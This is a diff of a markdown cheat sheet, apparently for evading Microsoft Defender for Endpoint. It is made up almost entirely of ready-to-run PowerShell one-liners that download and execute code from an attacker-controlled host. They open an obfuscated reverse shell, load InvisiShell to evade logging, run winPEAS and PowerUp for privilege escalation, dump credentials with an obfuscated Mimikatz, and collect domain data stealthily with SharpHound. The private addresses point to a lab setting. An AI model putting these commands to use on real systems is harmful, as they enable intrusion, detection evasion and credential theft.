@@ -43,32 +43,32 @@ These are all just for MDE. Anything serious and you're on your own
 
 These only work on PowerShell 3.0. Don't downgrade to 2.0 you will instantly get caught
 
-- Reverse Shell
+- **Reverse Shell**
 ```
 iex (iwr http://172.16.100.X/Invoke-PowerShellTcp-OBFS.ps1 -UseBasicParsing); Invoke-PowerShellTcp -Reverse -IPAddress 172.16.100.X -Port 443
 ```
 
-- Load `InvisiShell`
+- **Log Evasion**
 ```
 iwr http://172.16.100.X/InvisiShellProfiler.dll -UseBasicParsing -OutFile InvisiShellProfiler.dll;
 iex (iwr http://172.16.100.X/RunWithRegistryNonAdmin.bat -UseBasicParsing);
 iex (iwr http://172.16.100.X/RunWithPathAsAdmin.bat -UseBasicParsing);
 ```
 
-- Privilege Escalation
+- **Privilege Escalation**
 ```
 iex (iwr http://172.16.100.X/winPEAS-OBFS.bat -UseBasicParsing);
 iex (iwr http://172.16.100.X/PowerUp.ps1 -UseBasicParsing); Invoke-AllChecks;
 ```
 
-- Dump Creds
+- **Dump Creds**
 ```
 iex (iwr http://172.16.100.X/Invoke-Mimikatz-OBFS.ps1 -UseBasicParsing); Invoke-Mimikatz -GetPwned;
 ```
 
-- Domain Abuse
+- **Domain Abuse**
 
-**SHARPHOUND TOUCHES DISK OBVIOUSLY**
+SHARPHOUND TOUCHES DISK OBVIOUSLY
 
 ```
 iex (iwr http://172.16.99.77/SharpHound.ps1); Invoke-BloodHound -CollectionMethod All -Stealth -ExcludeDCs;
